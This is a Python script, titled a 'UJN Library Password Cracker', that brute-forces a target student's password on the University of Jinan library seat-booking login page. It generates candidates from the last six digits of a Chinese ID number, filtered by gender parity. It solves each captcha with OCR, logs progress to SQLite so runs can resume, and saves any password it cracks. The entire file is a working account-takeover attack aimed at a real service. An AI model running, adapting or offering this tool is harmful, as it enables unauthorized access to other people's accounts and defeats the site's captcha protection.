# -*- coding: utf-8 -*-
import argparse
import sqlite3
import sys
import time
from datetime import datetime

import ddddocr
from playwright.sync_api import sync_playwright

# ================= 配置区域 =================
DB_FILE = "crack.db"
# ===========================================


def init_db():
    """初始化数据库表结构"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    # 结果表：记录破解成功的密码
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS found_passwords (
        username TEXT PRIMARY KEY,
        password TEXT,
        found_at TIMESTAMP
    )
    """)

    # 详细进度表：记录每个用户在每一天（01-31）维度的最后一次尝试失败的密码
    # 联合主键 (username, day_prefix)
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS crack_progress_detail (
        username TEXT,
        day_prefix TEXT,
        last_tried_password TEXT,
        updated_at TIMESTAMP,
        PRIMARY KEY (username, day_prefix)
    )
    """)

    conn.commit()
    return conn


def get_progress_map(conn, username):
    """
    获取指定用户的所有进度信息。
    返回字典: { '01': '010011', '02': '029999', ... }
    """
    cursor = conn.cursor()
    cursor.execute(
        "SELECT day_prefix, last_tried_password FROM crack_progress_detail WHERE username = ?",
        (username,),
    )
    rows = cursor.fetchall()
    return {row[0]: row[1] for row in rows}


def update_progress(conn, username, day_prefix, password):
    """更新特定天数的进度（记录当前已尝试过的密码）"""
    cursor = conn.cursor()
    cursor.execute(
        """
    INSERT OR REPLACE INTO crack_progress_detail (username, day_prefix, last_tried_password, updated_at)
    VALUES (?, ?, ?, ?)
    """,
        (username, day_prefix, password, datetime.now()),
    )
    conn.commit()


def save_success(conn, username, password):
    """保存破解成功的密码"""
    cursor = conn.cursor()
    cursor.execute(
        """
    INSERT OR REPLACE INTO found_passwords (username, password, found_at)
    VALUES (?, ?, ?)
    """,
        (username, password, datetime.now()),
    )
    conn.commit()


def generate_passwords(gender="M", specific_day=None, progress_map=None):
    """
    生成器：生成符合身份证后6位规则的字符串
    结构：DD(日) + SSS(顺序码) + C(校验位)

    gender: 'M' (男, 奇数顺序码) 或 'F' (女, 偶数顺序码)
    specific_day: 可选字符串 (如 '01', '08'), 若指定则只生成该天的密码
    progress_map: 字典 {day_prefix: last_password}, 用于断点续传
    """
    if progress_map is None:
        progress_map = {}

    # 确定要遍历的天数范围
    if specific_day:
        days = [specific_day]
    else:
        days = [f"{d:02d}" for d in range(1, 32)]

    # 确定性别的奇偶校验
    # 身份证第17位（倒数第2位）: 奇数男，偶数女
    # 对应的顺序码 SSS 的最后一位 (index 2)
    target_remainder = 1 if gender.upper() == "M" else 0

    for dd in days:
        # 检查该天是否有历史进度
        resume_pw = progress_map.get(dd)
        skipping = True if resume_pw else False

        # 遍历顺序码 000-999
        for seq in range(1000):
            # 筛选性别
            if seq % 2 != target_remainder:
                continue

            sss = f"{seq:03d}"

            # 遍历校验位 0-9
            for check in range(10):
                c = str(check)
                password = f"{dd}{sss}{c}"

                # 跳过逻辑
                if skipping:
                    if password == resume_pw:
                        skipping = False
                    continue

                # yield (密码, 当前天前缀)
                yield password, dd


def run_crack():
    parser = argparse.ArgumentParser(description="UJN Library Password Cracker")
    parser.add_argument("username", help="目标学号")
    parser.add_argument(
        "--gender",
        "-g",
        choices=["M", "F"],
        default="M",
        help="目标性别 (M=男, F=女), 默认 M",
    )
    parser.add_argument(
        "--day",
        "-d",
        help="指定只跑某一天的密码 (例如 '08' 或 '25'), 默认跑 01-31",
    )

    args = parser.parse_args()
    target_username = args.username
    target_gender = args.gender
    target_day = args.day

    if target_day and (not target_day.isdigit() or len(target_day) != 2):
        print("错误: --day 参数必须是2位数字, 例如 '05'")
        sys.exit(1)

    print(f"[*] 目标用户: {target_username}")
    print(f"[*] 目标性别: {'男' if target_gender == 'M' else '女'}")
    if target_day:
        print(f"[*] 指定日期: {target_day}")

    # 1. 初始化数据库并读取进度
    conn = init_db()
    progress_map = get_progress_map(conn, target_username)

    if progress_map:
        print(f"[*] 已加载 {len(progress_map)} 条历史进度记录。")
    else:
        print("[*] 无历史进度，从头开始...")

    # 2. 初始化密码生成器
    password_gen = generate_passwords(
        gender=target_gender, specific_day=target_day, progress_map=progress_map
    )

    # 3. 初始化 OCR
    ocr = ddddocr.DdddOcr(show_ad=False, old=True)

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)
        context = browser.new_context()
        page = context.new_page()

        print("正在打开登录页面...")
        page.goto("https://seat.ujn.edu.cn/libseat/#/login")
        page.wait_for_load_state("networkidle")

        # 获取第一个要尝试的密码
        try:
            current_password, current_day = next(password_gen)
        except StopIteration:
            print("密码生成器为空或已遍历所有组合。")
            conn.close()
            return

        while True:
            try:
                print(f"[-] [{current_day}] 尝试: {current_password}")

                # 1. 填写账号
                page.fill("input[placeholder='请输入账号']", target_username)
                # 2. 填写密码
                page.fill("input[placeholder='请输入密码']", current_password)

                # 3. 处理验证码
                captcha_elem = page.locator(".captcha-wrap img").first
                if not captcha_elem.count():
                    captcha_elem = page.locator("img[src^='data:image']").first

                # 截图并识别
                try:
                    captcha_bytes = captcha_elem.screenshot(timeout=3000)
                except Exception:
                    print("    截图超时或失败，刷新页面重试...")
                    page.reload()
                    page.wait_for_load_state("networkidle")
                    continue

                code = ocr.classification(captcha_bytes)
                if isinstance(code, dict):
                    code = code.get("text", "")

                print(f"    验证码: {code}")
                page.fill("input[placeholder='请输入验证码']", str(code))

                # 4. 点击登录
                login_btn = page.query_selector(
                    "button:has-text('登录')"
                ) or page.query_selector(".login-btn")
                if login_btn:
                    login_btn.click()
                else:
                    print("    未找到登录按钮，刷新重试...")
                    page.reload()
                    continue

                # 5. 结果判断轮询 (3秒内检测)
                result_detected = False
                for _ in range(15):  # 15 * 0.2s = 3s
                    time.sleep(0.2)

                    # === 情况A: 登录成功 ===
                    if "/home" in page.url or page.locator(".user-info").count() > 0:
                        print(f"\n{'=' * 30}")
                        print(f"✅ 登录成功！密码是: {current_password}")
                        print(f"{'=' * 30}\n")

                        # 保存结果到数据库
                        save_success(conn, target_username, current_password)
                        print(f"已保存结果到数据库 {DB_FILE}")
                        conn.close()
                        return  # 结束程序

                    # === 情况B: 错误提示 ===
                    error_elem = page.locator(
                        ".el-message__content, .el-message--error"
                    ).first
                    if error_elem.count() > 0 and error_elem.is_visible():
                        err_text = error_elem.inner_text()
                        print(f"    ❌ 提示: {err_text}")
                        result_detected = True

                        if "验证码" in err_text:
                            # 验证码错误：不更新进度，刷新验证码，重试当前密码
                            print("    -> 验证码错误，重试...")
                            captcha_elem.click()
                            time.sleep(1)
                            break  # 跳出轮询，进入下一次 while循环（current_password 不变）

                        elif "密码" in err_text or "账号" in err_text:
                            # 密码错误：更新进度，获取下一个密码
                            # 记录此密码已试错 (使用 current_day 作为 key)
                            update_progress(
                                conn, target_username, current_day, current_password
                            )

                            try:
                                current_password, current_day = next(password_gen)
                            except StopIteration:
                                print("所有密码组合已遍历完毕。")
                                conn.close()
                                return

                            # 刷新验证码，准备下一次
                            captcha_elem.click()
                            time.sleep(0.5)
                            break  # 跳出轮询，进入下一次 while循环

                        elif "锁定" in err_text:
                            print("🚨 账号已被锁定，程序停止。")
                            conn.close()
                            return

                        else:
                            # 未知错误：记录进度，尝试下一个，防止死循环
                            print("    -> 未知错误，尝试下一个...")
                            update_progress(
                                conn, target_username, current_day, current_password
                            )
                            try:
                                current_password, current_day = next(password_gen)
                            except StopIteration:
                                conn.close()
                                return
                            captcha_elem.click()
                            break

                # 如果轮询结束还没检测到结果
                if not result_detected:
                    print("    ⚠️ 未检测到明确结果（可能响应慢），重试当前密码...")
                    page.reload()
                    page.wait_for_load_state("networkidle")

            except Exception as e:
                print(f"发生异常: {e}")
                try:
                    page.reload()
                    page.wait_for_load_state("networkidle")
                except:
                    pass

        conn.close()
        browser.close()


if __name__ == "__main__":
    run_crack()
